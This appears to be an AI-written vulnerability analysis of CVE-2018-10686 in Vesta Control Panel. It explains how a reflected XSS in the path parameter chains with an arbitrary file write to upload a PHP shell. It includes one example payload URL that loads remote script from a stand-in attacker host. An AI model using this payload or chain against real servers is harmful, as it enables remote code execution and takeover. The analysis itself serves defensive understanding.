Based on the provided content, here's a breakdown of the vulnerability described in CVE-2018-10686:

**Root Cause:**

*   The vulnerability stems from a reflected Cross-Site Scripting (rXSS) flaw in the `web/view/file/index.php` file of Vesta Control Panel. Specifically, the `$path` parameter on line 40 is injected without proper sanitization.
*   A separate file upload vulnerability exists within `web/upload/UploadHandler.php` where, when an existing file is targeted, the `file_put_contents()` function is called (line 1120/1121) without sufficient controls allowing arbitrary writes.

**Weaknesses/Vulnerabilities Present:**

*   **Reflected XSS:** The unsanitized injection of the `$path` variable in `web/view/file/index.php` allows an attacker to inject malicious JavaScript code into the page.
*   **Arbitrary File Write:** Due to insufficient checks when an existing file is targeted, the `file_put_contents()` function in  `web/upload/UploadHandler.php` allows arbitrary file writes to the server, which goes beyond the intended file upload locations of `/tmp` or `/home/$user`.
*   **Lack of Input Validation/Sanitization:** The application fails to sanitize the `$path` parameter, leading to XSS. It also lacks proper validation when overwriting files during uploads.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** By combining the reflected XSS and arbitrary file write vulnerabilities, an attacker can inject malicious Javascript that triggers the upload of a PHP shell to an arbitrary location. Once the PHP shell is uploaded, the attacker can then execute arbitrary code on the server.

**Attack Vectors:**

*   **Malicious URL:** An attacker crafts a malicious URL containing a JavaScript payload within the `path` parameter, e.g., `http://victim.site:8083/view/file/index.php?path=x" onerror=$.getScript("http://attacker.site/malicious.js") style="`.
*   **Social Engineering:** The victim is tricked into clicking the malicious URL, usually through phishing or other forms of social engineering.
*   **File Upload:** The malicious JavaScript then uses the file upload functionality, but targeting an existing file to trigger the `file_put_contents()` function, allowing arbitrary file writes.

**Required Attacker Capabilities/Position:**

*   **Ability to craft a malicious URL:** An attacker needs to craft a URL with a malicious script in the `path` parameter.
*   **Ability to trick the victim:** The attacker needs a way to convince the victim to click on the malicious URL.
*   **Knowledge of VestaCP:** The attacker needs knowledge of how the file upload mechanism works in Vesta CP.
*   **Accessibility to the control panel:** The attacker doesn't need direct access to the victim's VestaCP account but requires the victim to be logged in.
